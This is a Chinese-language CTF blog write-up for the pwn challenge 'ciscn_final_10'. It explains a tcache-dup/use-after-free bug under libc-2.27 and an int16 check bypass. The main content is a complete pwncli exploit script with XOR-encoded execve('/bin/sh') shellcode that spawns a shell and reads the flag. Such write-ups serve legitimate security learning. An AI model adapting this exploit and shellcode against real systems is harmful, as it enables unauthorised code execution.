# ciscn_final_10



### 总结

一道简单的`tcache dup`的题，前面需要绕过校验，注意一下函数的参数为`int16`。最后把`shellcode`处理一下即可。

<!-- more -->



### checksec

![image-20211024175808704](C:/Users/CHuan/AppData/Roaming/Typora/typora-user-images/image-20211024175808704.png)

版本为`libc-2.27`，无`tcache dup`检测。



### 漏洞点

判断是否为`0`的函数的参数为`int16`。

![image-20211024175856360](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211024175856360.png)

`uaf`：

![image-20211024175955341](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211024175955341.png)



### EXP

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def add(size, data):
    p.sendlineafter("> ", "1")
    p.sendlineafter("> ", str(size))
    p.sendafter("> ", data)

def dele():
    p.sendlineafter("> ", "2")

p.sendafter("> ", "a")
p.sendlineafter("> ", str(-2147483648))

# add 
add(0x20, 0x20*"a")
dele()
dele()

add(0x20, "\x90")
add(0x20, "a"*0x20)

add(0x20, "The cake is a lie!\x00")

p.sendlineafter("> ", "3")

payload = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x00\x00\x00\x00"

pl = [1]
ss = 1
for i in payload:
    ss ^= i
    pl.append(ss) 

p.sendlineafter("> ", bytes(pl))

p.sendline("cat /flag")
p.interactive()
```



### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2021-10-24-ciscn-final-10/  

